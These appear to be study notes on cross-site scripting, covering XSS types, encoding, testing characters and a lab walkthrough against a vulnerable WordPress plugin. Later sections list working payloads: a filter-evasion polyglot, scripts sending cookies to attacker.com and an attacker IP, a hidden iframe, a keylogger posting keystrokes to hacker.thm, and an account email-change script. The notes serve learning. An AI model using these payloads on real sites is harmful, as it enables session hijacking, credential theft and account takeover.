

XSS vulnerability is created when a web page allows unsanitized data.
Sanitizing data processes user input so that all dangerous characters or strings are removed or transformed.

Regardless of how the XSS payload is delivered and executed, the injected scripts run under the context of the user viewing the affected page.  
It's the user’s browser, not the web application, executes the XSS payload.  
These attacks can have a significant impact resulting in session hijacking, forced redirection to malicious pages, execution of local applications as that user, etc.  

[BeEF](BeEF.md) - Can leverage XSS vulns to launch many different client-side attacks.  
  
# Stored vs Reflected
## Stored
- aka: Persistent XSS, occurs when the exploit payload is stored in a database or otherwise cached by a server.  
- The web application then retrieves this payload and displays it to anyone that views a vulnerable page.  
- A single Stored XSS vulnerability can therefore attack all users of the site.  
- Exists in:
	- forum software
	- comment sections
	- product reviews

## Reflected
- Usually include the payload in a crafted request or link.  
- The web application takes this value and places it into the page content.  
- This variant only attacks the person submitting the request or viewing the link.  
- User-supplied data in an HTTP request is included in the webpage source without any validation.  
- Occurs in:
	- search fields and results
	- anywhere user input is included in error messages.  

## DOM-based
- Similar to previous two, but takes place solely within the page’s Document Object Model (DOM).  
- A browser parses a page’s HTML content and generates an internal DOM representation.  
- JavaScript can programmatically interact with this DOM.  
- Occurs when a page’s DOM is modified with user-controlled values.  
- DOM-based XSS can be stored or reflected.  
- The key difference is that DOM-based XSS attacks occur when a browser (not the web app) parses the page’s content and the inserted JavaScript is executed.  

## Blind
- Similar to stored, however you can't see it working or be able to test for it on yourself.  
- Ex: Injecting into a staff contact form where the malicious code gets turned into a support ticket which the staff views on a private web portal.
  
# Javascript

When a browser processes a server's HTTP response containing HTML, the browser creates a DOM tree and renders it.
The DOM is comprised of all forms, inputs, images, etc. related to the web page.

JavaScript's role is to access and modify the page's DOM, resulting in a more interactive user experience.

If we can inject JavaScript code into the application, we can access and modify the page's DOM.
With access to the DOM, we can redirect login forms, extract passwords, and steal session cookies.

Ex of simple JS function:
```javascript
function multiplyValues(x,y) {
  return x * y;
}
 
let a = multiplyValues(3, 5)
console.log(a)
```



# Encoding

Most common types:
- HTML encoding (character references)
	- Used to display characters that have special meanings
		- Ex:   "<" is the character reference for "<". When encountering this type of encoding, the browser will not interpret the character as the start of an element, but will display the actual character as-is.
- URL encoding (% encoding)
	- Ex:  Space is %20


If we can inject these special characters into the page, the browser will treat them as code elements.
We may need to use different sets of characters, depending on where our input is being included.

Ex:
- If added between _div_ tags
	- need to include our own _script_ tags and
	- need to be able to inject "<" and ">" as part of the payload.
- If added within an existing JavaScript tag
	- might only need quotes and semicolons to add our own code.


# ID'ing
Identify input fields which display input data as output in subsequent pages.  
By entering characters that are used in common scripting languages, we can find out what's filtered/ sanitized and what's not.  

## ID Stored
- Comments on a blog  
- User profile information  
- Website Listings  
## ID Reflective
- Parameters in the URL Query String  
- URL File Path  
- Sometimes HTTP Headers  
## ID DOM 
- Challenging to test for, requires a certain amount of knowledge of JS.  
- Look for parts of code that access certain variables that an attacker can have control over, such as "window.location.x" parameters.  
- Then need to see how they are handled & whether the values are ever written to the web page's DOM or passed to unsafe JavaScript methods such as **eval()**.  

# Testing

### Most common characters used
```javascript
< > ' " { } ;
```
	 JavaScript and HTML

- HTML uses _**<**_ and _**>**_ to denote elements
- JS uses _**{**_ and _**}**_ in function declarations
- _**'**_ and _**"**_ are used to denote strings
- _**;**_ is used to denote end of a statement

# Basic Attacks

Attack against Offsec's WordPress site.
- Running a plugin named *Visitors* that's vulnerable to stored-XSS
	- Main feature is to log website's visitor data:
		- IP
		- Source
		- User-Agent
		- etc
- Source code can be downloaded from the site

1. Inspecting the **database.php** script to verify how the data is stored
```php
function VST_save_record() {
	global $wpdb;
	$table_name = $wpdb->prefix . 'VST_registros';

	VST_create_table_records();

	return $wpdb->insert(
				$table_name,
				array(
					'patch' => $_SERVER["REQUEST_URI"],
					'datetime' => current_time( 'mysql' ),
					'useragent' => $_SERVER['HTTP_USER_AGENT'],    //<--- note
					'ip' => $_SERVER['HTTP_X_FORWARDED_FOR']
				)
			);
}
```
	Visitor Plugin Record Creation Function
	- Responsible for parsing HTTP request headers
		- including User-Agent header stored into *useragent* record value


2. When a WP admin loads the *Visitor* plugin, the function will execute the following portion of code from **start.php**
```php
$i=count(VST_get_records($date_start, $date_finish));
foreach(VST_get_records($date_start, $date_finish) as $record) {
    echo '
        <tr class="active" >
            <td scope="row" >'.$i.'</td>
            <td scope="row" >'.date_format(date_create($record->datetime), get_option("links_updated_date_format")).'</td>
            <td scope="row" >'.$record->patch.'</td>
            <td scope="row" ><a href="https://www.geolocation.com/es?ip='.$record->ip.'#ipresult">'.$record->ip.'</a></td>
            <td>'.$record->useragent.'</td>    //<--- note
        </tr>';
    $i--;
}
```
	Visitors Plugin Record Visualization Function
	- *useragent* record value is retrieved from the database and inserted in the Table Data (_td_) HTML tag, w/o any sort of data sanitization.

As the User-Agent is under our control, we can send to BurpSuite's Repeater to inject malicious JS code
![](xss_repeater.png)

With a 200 Response code, payload should be stored.

To verify
- Log in to the admin console at **http://offsecwp/wp-login.php** using the _admin/password_ creds
- Navigate to the Visitors plugin console at **http://offsecwp/wp-admin/admin.php?page=visitors-app%2Fadmin%2Fstart.php**
- Should see a banner popup stating '42'

# Privilege Escalation



# Removed from course
Useful for identifying what remains after filtering for XSS attacks  
```html
'';!--"<XSS>=&{()}
```


Even if a server returns the above w/ _**&lt**_ and _**&gt**_ in place of _**<**_ and _**>**_, you may still be able to inject into an existing IMG tag:  
```html
SRC=javascript:alert('XSS')
```

  
When testing an HTML field using
```html
<hr>
```
	can create an obvious indicator  
  
Different sets of characters may be needed depending on where our input is being included.  
For example, if our input is being added between div tags, we will need to include our own script tags and will need to be able to inject “<” and “>” as part of the payload.  
If our input is being added within an existing JavaScript tag, we might only need quotes and semicolons to add our own code.  
  

### Attacks:
- Implement pw guessing against internal web apps  
- Steal creds by creating a fake login prompt  
- Add browser keystroke logger  
- Take screenshot of browser page  
- Port scan internal servers  
- Redirect a form to an attacker  
- Capture microphone & camera  
- Deploy JS cryptominer  
- Retreive user cookie token:  
```html
<script>document.location='http://attacker.com/save.php?c='+document.cookie</script>
```


Polyglots:  
A string of text which can escape attributes, tags and bypass filters all in one.  
```html
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
```


### Content Injection:
XSS vulns are often used to deliver client-side attacks as they allow the attacker to redirect the victim's browser to their choosing.  
A stealthier alternative is to inject an invisible I-frame"  
```html
<iframe src=http://attack.com/payload height="0" width="0"></iframe>
```


Can also redirect the victim browser to a client-side attack or to an information gathering script.  
(Need the User-Agent to determine the victim's browser)  
  

### Stealing Cookies & Session Info:
If the web app uses insecure session management, we can use XSS to steal a user's cookies and masquarade as that user within the target website.  
```html
<script>new Image().src="http://attackerip/cool.jpg?output="+document.cookie;</script>
```

  
Once a logged in user visits the affected page, their session data is sent to the attacker's ip ([nc](Tools.md#netcat) listener)
![[cookie_steal.png]]

\[\[\[\[\[\[\[ Cookie Editor \]\]\]\]\]\]\] - Cookie setting and management add-on for Firefox  
  
***Note:** This attack is session-specific. Once we steal the session, we can masquerade as the victim until they log out or their session expires.  
  
We're now able to set our cookie name=value pair to **PHPSESSID=delkcrm4vdkgqcqvkrs7ehlghe  
**  
  
  
Keylogger:  
```html
<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
```
	btoa - base64 encode  
  
  
Change Email:  
```html
<script>user.changeEmail('attacker@hacker.thm');</script>
```



